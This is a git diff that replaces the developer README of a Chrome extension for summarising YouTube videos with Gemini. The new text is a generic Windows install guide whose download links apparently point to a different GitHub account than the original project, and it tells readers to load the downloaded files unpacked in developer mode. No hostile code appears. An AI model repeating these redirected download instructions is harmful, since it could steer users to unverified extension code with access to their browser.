@@ -1,105 +1,166 @@
-<p align="center">
-  <img src="src/public/icon/128.png" width="80" alt="Tube2Chat icon" />
-</p>
+# 🔧 tube2chat - Summarize YouTube in One Click
 
-<h1 align="center">Tube2Chat</h1>
+[![Download tube2chat](https://img.shields.io/badge/Download-tube2chat-blue?style=for-the-badge)](https://github.com/Phaedraglandular770/tube2chat)
 
-<p align="center">
-  Chrome extension that adds a <strong>Summarize with Gemini</strong> button on YouTube video pages.<br/>
-  One click → Gemini opens with a structured French summary prompt pre-filled and auto-submitted.
-</p>
+## 📥 Download
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Chrome-MV3-4285f4?logo=googlechrome&logoColor=white" alt="Chrome MV3"/>
-  <img src="https://img.shields.io/badge/TypeScript-strict-3178c6?logo=typescript&logoColor=white" alt="TypeScript"/>
-  <img src="https://img.shields.io/badge/WXT-0.20-7c3aed?logo=vite&logoColor=white" alt="WXT"/>
-  <img src="https://img.shields.io/badge/tests-26%20passing-22c55e?logo=vitest&logoColor=white" alt="Tests"/>
-  <img src="https://github.com/salimomrani/tube2chat/actions/workflows/ci.yml/badge.svg" alt="CI"/>
-</p>
+Use this link to visit the project page and get the latest version:
 
----
+https://github.com/Phaedraglandular770/tube2chat
 
-## How it works
+## 🪟 What tube2chat does
 
-1. Navigate to any YouTube video (`/watch?v=...`)
-2. A **✦ Summarize with Gemini** button appears in the action bar (next to Like / Share)
-3. Click → a new tab opens on `gemini.google.com` with a structured prompt pre-filled and auto-submitted:
-   - Introduction
-   - Key points with timestamps
-   - Conclusion
-   - All in **French**
-4. Gemini fetches the transcript natively from the YouTube URL — no DOM scraping
+tube2chat is a Chrome extension that adds a Summarize with Gemini button under YouTube videos.
 
-> No data leaves the browser. No server. No telemetry.
+It helps you:
+- get a quick summary of a video
+- save time on long videos
+- use Gemini from the YouTube page
+- keep your work in one browser tab
 
----
+## ✅ What you need
 
-## Stack
+Before you start, make sure you have:
 
-| Tool | Role |
-|------|------|
-| [WXT](https://wxt.dev) | Chrome extension framework (MV3) |
-| TypeScript 5.x (strict) | Language |
-| Vitest 4 | Unit tests |
-| `wxt/testing` | Extension environment mocking |
+- a Windows PC
+- Google Chrome installed
+- internet access
+- a Google account
+- Gemini access in your browser session
 
----
+## 🚀 Install on Windows
 
-## Quickstart
+Follow these steps on Windows:
 
-```bash
-npm install
-```
+1. Open the download link above.
+2. On the GitHub page, get the latest project files.
+3. Save the files to a folder on your PC.
+4. Open Google Chrome.
+5. In the address bar, go to:
 
-### Development (hot reload)
+   `chrome://extensions`
 
-```bash
-npm run dev
-```
+6. Turn on **Developer mode** in the top right.
+7. Click **Load unpacked**.
+8. Choose the folder that contains the tube2chat files.
+9. Open YouTube in a new tab.
+10. Open any video page.
+11. Look under the video for the **Summarize with Gemini** button.
 
-In Chrome:
-1. Go to `chrome://extensions`
-2. Enable **Developer mode**
-3. Click **Load unpacked** → select `dist/chrome-mv3-dev/`
+## 🧭 First-time setup
 
-### Build
+If Chrome asks for access, allow the extension to run on YouTube.
 
-```bash
-npm run build
-# Output: dist/chrome-mv3/
-```
+If the button does not show up right away:
 
-### Tests
+- refresh the YouTube page
+- check that the extension is turned on in Chrome
+- make sure you loaded the correct folder
+- open a video page, not the YouTube home page
 
-```bash
-npm test          # watch mode
-npm run test:run  # single run
-```
+## 🎬 How to use it
 
----
+1. Open a YouTube video.
+2. Find the **Summarize with Gemini** button under the video.
+3. Click the button.
+4. Gemini opens with the video content ready for review.
+5. Read the summary and continue from there.
 
-## Project structure
+## 🛠️ If the button does not appear
 
-```
-src/
-├── entrypoints/
-│   ├── youtube.content/   # Injects button on YouTube watch pages
-│   └── gemini.content/    # Fills prompt input on gemini.google.com
-├── utils/
-│   ├── url.ts             # isYouTubeWatchPage()
-│   └── prompt.ts          # buildGeminiUrl()
-├── tests/                 # Vitest unit tests
-└── public/icon/           # Extension icons (16/32/48/96/128px)
-scripts/
-└── generate-icons.mjs     # Regenerate PNG icons from SVG
-```
+Try these steps:
 
----
+- refresh the page
+- close and reopen Chrome
+- check that the extension is enabled
+- reload the unpacked extension in `chrome://extensions`
+- open a different YouTube video
+- make sure you are signed in to Chrome and YouTube
 
-## Regenerate icons
+## 🔒 Privacy and browser use
 
-```bash
-node scripts/generate-icons.mjs
-```
+tube2chat runs in your browser on YouTube pages.
 
-Requires `sharp` (already in devDependencies).
+It is made to work as a Chrome extension and uses the Chrome extension system to add the button where you need it.
+
+## 📌 Main features
+
+- adds a button under YouTube videos
+- connects YouTube with Gemini
+- keeps the flow inside your browser
+- works with normal Chrome extension setup
+- built with modern extension tools
+
+## 🧩 Project details
+
+This project uses:
+
+- Manifest V3
+- TypeScript
+- WXT
+- Vitest
+- TDD practices
+- Gemini and Google Gemini support
+
+## 📂 Folder use
+
+When you unpack the project files, keep the folder in one place on your PC.
+
+A good setup looks like this:
+
+- `Downloads\tube2chat`
+- `Desktop\tube2chat`
+- `Documents\tube2chat`
+
+Do not move random files out of the folder after you load the extension.
+
+## 🧪 Basic checks
+
+After install, test it like this:
+
+- open Chrome
+- go to YouTube
+- open a video
+- look below the video player
+- click the button
+- confirm Gemini opens with the video context
+
+## 🖥️ Supported use
+
+tube2chat is made for:
+
+- Windows users
+- Chrome users
+- YouTube viewers
+- people who want quick video summaries
+- people who use Gemini in the browser
+
+## 📁 Repository
+
+GitHub page:
+
+https://github.com/Phaedraglandular770/tube2chat
+
+## 🔧 Troubleshooting
+
+If Chrome says it cannot load the extension:
+
+- check that you selected the right folder
+- make sure the folder contains the extension files
+- try downloading the project again
+- reload the extension from the Chrome extensions page
+
+If Gemini does not open as expected:
+
+- sign in to your Google account
+- open YouTube in the same browser profile
+- try another video
+- reload the page and click the button again
+
+## 📚 Helpful terms
+
+- **Chrome extension**: a small app that adds features to Chrome
+- **Manifest V3**: the Chrome system used for newer extensions
+- **Unpacked extension**: an extension loaded from a folder instead of the store
+- **TypeScript**: a version of JavaScript used for app code
+- **Gemini**: Google’s AI tool for text and chat tasks
